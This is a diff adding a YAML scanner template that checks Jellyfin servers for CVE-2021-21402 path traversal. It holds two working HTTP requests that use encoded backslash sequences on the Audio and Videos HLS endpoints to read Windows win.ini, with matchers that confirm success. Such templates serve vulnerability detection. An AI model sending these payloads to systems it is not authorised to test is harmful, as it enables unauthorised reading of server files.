@@ -1,0 +1,47 @@
+id: jellyfin-arbitrary-file-read
+
+info:
+  name: Jellyfin Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Jellyfin is a free software media system. Prior to version 10.7.1, certain endpoints are vulnerable to arbitrary file read attacks through crafted requests. This issue is more prevalent when using Windows as the host OS. Servers exposed to the public internet are at potential risk.
+  classification:
+    cvss-score: 8.0
+    cve-id: CVE-2021-21402
+  tags: file-read
+
+http:
+  - raw:
+      - |
+        GET /Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/octet-stream
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "font"
+          - "file"
+          - "extension"
+        condition: and
+
+  - raw:
+      - |
+        GET /Videos/1/hls/m/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/octet-stream
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "font"
+          - "file"
+          - "extension"
+        condition: and
